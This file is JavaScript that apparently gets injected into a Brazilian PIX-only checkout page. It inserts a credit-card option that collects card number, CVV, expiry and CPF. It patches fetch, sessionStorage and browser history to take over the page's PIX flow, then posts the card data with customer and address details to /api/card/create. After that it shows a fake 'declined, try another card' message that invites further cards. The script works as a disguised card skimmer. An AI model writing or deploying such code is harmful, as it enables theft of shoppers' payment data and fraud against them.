const CARD_OPTION_ID = "checkout-card-option";
const CARD_FORM_ID = "checkout-card-fields";
const CARD_ERROR_ID = "checkout-card-error";
const CARD_DECLINE_MESSAGE =
  "Não foi possível realizar o pagamento com este cartão. Não se preocupe, tente novamente com outro cartão.";

const CARD_ICON = `<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>`;

let method = "pix";
let intercepting = false;
let showDecline = false;
let lastSignature = "";
let lastCheckoutState = {};
let observer = null;
const originalFetch = window.fetch.bind(window);

const fieldStyle =
  "height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;width:100%;box-sizing:border-box;font-size:14px;";
const errorStyle = "display:none;margin-top:4px;font-size:12px;color:#b91c1c;";

function digits(value) {
  return String(value || "").replace(/\D/g, "");
}

function isAmex(number) {
  return /^3[47]/.test(digits(number));
}

function formatCardNumber(value) {
  const raw = digits(value);
  const max = isAmex(raw) ? 15 : 16;
  const sliced = raw.slice(0, max);
  if (isAmex(sliced)) {
    return sliced.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/, (_, a, b, c) =>
      [a, b, c].filter(Boolean).join(" "),
    );
  }
  return sliced.replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatExpiry(value) {
  const raw = digits(value).slice(0, 4);
  if (raw.length <= 2) return raw;
  return `${raw.slice(0, 2)}/${raw.slice(2)}`;
}

function formatCpf(value) {
  const raw = digits(value).slice(0, 11);
  return raw
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function formatCvv(value, number) {
  return digits(value).slice(0, isAmex(number) ? 4 : 3);
}

function validCpf(value) {
  const cpf = digits(value);
  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
  const check = (len) => {
    let sum = 0;
    for (let i = 0; i < len; i++) sum += Number(cpf[i]) * (len + 1 - i);
    const rest = (sum * 10) % 11;
    return (rest === 10 ? 0 : rest) === Number(cpf[len]);
  };
  return check(9) && check(10);
}

function validLuhn(number) {
  let sum = 0;
  let double = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = Number(number[i]);
    if (double) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    double = !double;
  }
  return sum % 10 === 0;
}

function findPayButton() {
  return [...document.querySelectorAll("button")].find((el) =>
    /Gerar PIX e finalizar|Pagar com cartão/i.test(el.textContent || ""),
  );
}

function syncPayButton() {
  const button = findPayButton();
  if (!button) return;
  const next = method === "card" ? "Pagar com cartão" : "Gerar PIX e finalizar";
  if (button.textContent !== next) button.textContent = next;
  button.style.display = showDecline && method === "card" ? "none" : "";
}

function currentFields() {
  const root = document.getElementById(CARD_FORM_ID);
  const value = (name) => root?.querySelector(`[data-card="${name}"]`)?.value || "";
  const expiry = value("expiry");
  const [expiryMonth = "", expiryYear = ""] = expiry.split("/");
  return {
    holderName: value("holderName"),
    number: value("number"),
    expiry,
    expiryMonth,
    expiryYear,
    cvv: value("cvv"),
    holderCpf: value("holderCpf"),
    installments: value("installments") || "1",
  };
}

function setFieldError(name, message) {
  const root = document.getElementById(CARD_FORM_ID);
  const input = root?.querySelector(`[data-card="${name}"]`);
  const hint = root?.querySelector(`[data-error="${name}"]`);
  if (input) input.style.borderColor = message ? "#dc2626" : "#d1d5db";
  if (hint) {
    hint.textContent = message || "";
    hint.style.display = message ? "block" : "none";
  }
}

function validateCard(card) {
  const number = digits(card.number);
  const cvv = digits(card.cvv);
  const month = Number(digits(card.expiryMonth));
  const yearRaw = digits(card.expiryYear);
  const year = Number(yearRaw.length === 2 ? `20${yearRaw}` : yearRaw);
  const amex = isAmex(number);
  const now = new Date();
  const errors = {};

  if (!String(card.holderName || "").trim()) errors.holderName = "Informe o nome impresso no cartão";
  if (number.length !== (amex ? 15 : 16) || !validLuhn(number)) {
    errors.number = "Informe um número de cartão válido";
  }
  if (!month || month < 1 || month > 12 || !year || year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
    errors.expiry = "Informe uma validade válida";
  }
  if (cvv.length !== (amex ? 4 : 3)) errors.cvv = "Informe um CVV válido";
  if (!validCpf(card.holderCpf)) errors.holderCpf = "Informe o CPF do titular";

  setFieldError("holderName", errors.holderName);
  setFieldError("number", errors.number);
  setFieldError("expiry", errors.expiry);
  setFieldError("cvv", errors.cvv);
  setFieldError("holderCpf", errors.holderCpf);

  return errors.holderName || errors.number || errors.expiry || errors.cvv || errors.holderCpf || "";
}

function bindMasks(root) {
  const number = root.querySelector('[data-card="number"]');
  const expiry = root.querySelector('[data-card="expiry"]');
  const cvv = root.querySelector('[data-card="cvv"]');
  const cpf = root.querySelector('[data-card="holderCpf"]');
  const holder = root.querySelector('[data-card="holderName"]');

  number?.addEventListener("input", () => {
    number.value = formatCardNumber(number.value);
    if (cvv) cvv.value = formatCvv(cvv.value, number.value);
    cvv?.setAttribute("maxlength", isAmex(number.value) ? "4" : "3");
    setFieldError("number", "");
  });
  expiry?.addEventListener("input", () => {
    expiry.value = formatExpiry(expiry.value);
    setFieldError("expiry", "");
  });
  cvv?.addEventListener("input", () => {
    cvv.value = formatCvv(cvv.value, number?.value);
    setFieldError("cvv", "");
  });
  cpf?.addEventListener("input", () => {
    cpf.value = formatCpf(cpf.value);
    setFieldError("holderCpf", "");
  });
  holder?.addEventListener("input", () => setFieldError("holderName", ""));
}

function retryAnotherCard() {
  showDecline = false;
  intercepting = false;
  renderCardOption();
  queueMicrotask(() => {
    document.querySelector('[data-card="number"]')?.focus();
  });
}

function payWithPixNow() {
  showDecline = false;
  intercepting = false;
  method = "pix";
  renderCardOption();
  queueMicrotask(() => {
    findPayButton()?.click();
  });
}

function renderCardOption() {
  const pixLabel = [...document.querySelectorAll("label")].find((label) =>
    label.textContent?.includes("PIX"),
  );
  if (!pixLabel?.parentElement) return;

  syncPayButton();

  const signature = `${method}:${showDecline ? "1" : "0"}`;
  const existing = document.getElementById(CARD_OPTION_ID);
  if (existing?.isConnected && lastSignature === signature) {
    syncPayButton();
    return;
  }

  const preserved = currentFields();
  observer?.disconnect();
  lastSignature = signature;

  let card = existing?.isConnected ? existing : null;
  if (!card) {
    card = document.createElement("div");
    card.id = CARD_OPTION_ID;
    pixLabel.parentElement.insertBefore(card, pixLabel.nextSibling);
  } else if (card.parentElement !== pixLabel.parentElement) {
    pixLabel.parentElement.insertBefore(card, pixLabel.nextSibling);
  }

  pixLabel.style.cursor = "pointer";
  pixLabel.style.opacity = method === "pix" ? "1" : "0.65";
  if (!pixLabel.dataset.payBound) {
    pixLabel.dataset.payBound = "1";
    pixLabel.addEventListener("click", () => {
      method = "pix";
      showDecline = false;
      renderCardOption();
    });
  }

  const selected = method === "card";
  card.style.marginTop = "12px";
  card.innerHTML = `
      <button type="button" data-pay="card" style="width:100%;display:flex;align-items:center;gap:12px;border:1px solid ${selected ? "#0b1f3a" : "#e5e7eb"};background:${selected ? "#e8f0fb" : "#fff"};border-radius:12px;padding:14px;cursor:pointer;text-align:left;">
        <span style="flex:none;width:44px;height:44px;border-radius:12px;border:1px solid #e5e7eb;background:#fff;color:#0b1f3a;display:flex;align-items:center;justify-content:center;">${CARD_ICON}</span>
        <span style="flex:1;min-width:0;">
          <span style="display:block;font-weight:700;color:#0b1f3a;">Cartão de crédito</span>
          <span style="display:block;font-size:12px;color:#4b5563;">Até 12x</span>
        </span>
        <span style="flex:none;width:18px;height:18px;border-radius:999px;border:2px solid ${selected ? "#0b1f3a" : "#d1d5db"};box-shadow:inset 0 0 0 ${selected ? "5px" : "0"} #0b1f3a;"></span>
      </button>
      <div id="${CARD_FORM_ID}" style="display:${selected ? "grid" : "none"};gap:10px;margin-top:12px;">
        <div>
          <input data-card="holderName" autocomplete="cc-name" placeholder="Nome impresso no cartão" style="${fieldStyle}" />
          <div data-error="holderName" style="${errorStyle}"></div>
        </div>
        <div>
          <input data-card="number" inputmode="numeric" autocomplete="cc-number" placeholder="Número do cartão" maxlength="19" style="${fieldStyle}" />
          <div data-error="number" style="${errorStyle}"></div>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
          <div>
            <input data-card="expiry" inputmode="numeric" autocomplete="cc-exp" placeholder="Validade MM/AA" maxlength="5" style="${fieldStyle}" />
            <div data-error="expiry" style="${errorStyle}"></div>
          </div>
          <div>
            <input data-card="cvv" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" maxlength="4" style="${fieldStyle}" />
            <div data-error="cvv" style="${errorStyle}"></div>
          </div>
        </div>
        <div>
          <input data-card="holderCpf" inputmode="numeric" placeholder="CPF do titular" maxlength="14" style="${fieldStyle}" />
          <div data-error="holderCpf" style="${errorStyle}"></div>
        </div>
        <select data-card="installments" style="${fieldStyle}">
          ${Array.from({ length: 12 }, (_, i) => `<option value="${i + 1}">${i + 1}x</option>`).join("")}
        </select>
        <div id="${CARD_ERROR_ID}" style="display:${showDecline ? "grid" : "none"};gap:10px;margin-top:4px;border:1px solid #fecaca;background:#fef2f2;border-radius:12px;padding:14px;">
          <div style="font-weight:700;color:#991b1b;">Pagamento não realizado</div>
          <div style="font-size:13px;line-height:1.45;color:#7f1d1d;">${CARD_DECLINE_MESSAGE}</div>
          <button type="button" data-retry-card style="height:44px;border:0;border-radius:10px;background:#0b1f3a;color:#fff;font-weight:700;cursor:pointer;">Tentar novamente outro cartão</button>
          <button type="button" data-pay-pix-now style="height:44px;border:1px solid #0b1f3a;border-radius:10px;background:#fff;color:#0b1f3a;font-weight:700;cursor:pointer;">Pague agora no PIX</button>
        </div>
      </div>`;

  const customerCpf = lastCheckoutState?.customer?.cpf || "";
  Object.entries({
    ...preserved,
    holderCpf: preserved.holderCpf || formatCpf(customerCpf),
    expiry: preserved.expiry || [preserved.expiryMonth, preserved.expiryYear].filter(Boolean).join("/"),
  }).forEach(([name, value]) => {
    const field = card.querySelector(`[data-card="${name}"]`);
    if (field && value) field.value = value;
  });

  card.querySelector("[data-pay='card']")?.addEventListener("click", () => {
    method = "card";
    showDecline = false;
    renderCardOption();
  });
  card.querySelector("[data-retry-card]")?.addEventListener("click", retryAnotherCard);
  card.querySelector("[data-pay-pix-now]")?.addEventListener("click", payWithPixNow);
  bindMasks(card);
  syncPayButton();
  observer?.observe(document.body, { childList: true, subtree: true });
}

async function payWithCard(state) {
  if (method !== "card") return { ok: false };
  if (intercepting) return { ok: false };
  intercepting = true;
  lastCheckoutState = state || lastCheckoutState;
  const card = currentFields();
  const invalid = validateCard(card);
  if (invalid) {
    intercepting = false;
    showDecline = false;
    document.getElementById(CARD_FORM_ID)?.scrollIntoView({ behavior: "smooth", block: "center" });
    return { ok: false };
  }
  try {
    const res = await originalFetch("/api/card/create", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...lastCheckoutState,
        amount: lastCheckoutState.amount,
        customer: lastCheckoutState.customer,
        items: lastCheckoutState.items,
        shippingAddress: lastCheckoutState.shippingAddress,
        utm: lastCheckoutState.utm,
        tracking: lastCheckoutState.tracking,
        card,
        installments: Number(card.installments || 1),
      }),
    });
    const data = await res.json();
    if (data.success && data.redirect) {
      window.location.href = data.redirect;
      return { ok: true };
    }
    intercepting = false;
    showDecline = true;
    renderCardOption();
    document.getElementById(CARD_ERROR_ID)?.scrollIntoView({ behavior: "smooth", block: "center" });
    return { ok: false };
  } catch {
    intercepting = false;
    showDecline = true;
    renderCardOption();
    return { ok: false };
  }
}

function requestUrl(input) {
  return typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
}

function isPixCreate(url) {
  return String(url).includes("/api/pix/create") || String(url).includes("checkout-create-pix");
}

window.fetch = async function patchedFetch(input, init) {
  if (method === "card" && isPixCreate(requestUrl(input))) {
    let state = lastCheckoutState;
    try {
      const raw = typeof init?.body === "string" ? init.body : sessionStorage.getItem("pixPageState") || "{}";
      state = JSON.parse(raw);
      lastCheckoutState = state;
    } catch {
      state = lastCheckoutState;
    }
    await payWithCard(state);
    return new Response(JSON.stringify({ success: false, blocked: true, error: CARD_DECLINE_MESSAGE }), {
      status: 409,
      headers: { "Content-Type": "application/json" },
    });
  }
  return originalFetch(input, init);
};

const originalSetItem = sessionStorage.setItem.bind(sessionStorage);
sessionStorage.setItem = function patchedSetItem(key, value) {
  originalSetItem(key, value);
  if (key === "pixPageState") {
    try {
      lastCheckoutState = JSON.parse(value);
    } catch {
      lastCheckoutState = lastCheckoutState;
    }
    if (method === "card") void payWithCard(lastCheckoutState);
  }
};

const originalPushState = history.pushState.bind(history);
history.pushState = function patchedPushState(state, title, url) {
  if (method === "card" && String(url || "").includes("/pix")) return;
  return originalPushState(state, title, url);
};

const originalReplaceState = history.replaceState.bind(history);
history.replaceState = function patchedReplaceState(state, title, url) {
  if (method === "card" && String(url || "").includes("/pix")) return;
  return originalReplaceState(state, title, url);
};

observer = new MutationObserver(() => renderCardOption());
observer.observe(document.body, { childList: true, subtree: true });
renderCardOption();
